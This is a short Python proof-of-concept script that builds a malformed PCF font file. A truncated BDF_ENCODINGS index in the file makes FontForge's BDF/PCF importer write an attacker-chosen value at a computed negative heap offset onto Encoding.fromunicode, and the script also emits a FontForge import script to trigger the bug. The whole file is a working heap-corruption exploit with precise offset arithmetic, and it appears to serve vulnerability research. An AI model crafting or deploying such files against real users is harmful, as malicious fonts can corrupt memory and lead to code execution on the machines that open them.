#!/usr/bin/env python3
"""W30: craft a PCF whose truncated BDF_ENCODINGS index writes a chosen value
into Encoding.fromunicode at encs-688.

Layout is the pinned truncated.pcf layout used by make-callpath-case.py.
With min2=max2=M2 and min1=max1=M1, tot=1 and i=0, the pinned RHS at
fvimportbdf.c:1751 is M2*256+M1. M2=0x4142, M1=0x43 gives 0x00414243,
a recognizable mapped address in the local non-PIE build's .text. A low
index byte of 0x54 gives glyph=0x54-256=-172, i.e. encs-688, the measured
offset of fromunicode in the live heap Encoding object.
"""
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
GLYPH = -172
VALUE = 0x414243

data = bytearray((HERE / "truncated.pcf").read_bytes()[:0x123])
struct.pack_into("<HHHH", data, 0x118, VALUE >> 8, VALUE >> 8, VALUE & 0xFF, VALUE & 0xFF)
data[0x122] = (256 + GLYPH) & 0xFF
out = HERE / "frompath.pcf"
out.write_bytes(data)
(HERE / "import-frompath.ff").write_text(f'New()\nImport("{HERE / "frompath.pcf"}")\n')
print(f"frompath.pcf: {len(data)} bytes glyph={GLYPH} value={VALUE:#08x} target=encs{GLYPH * 4}")
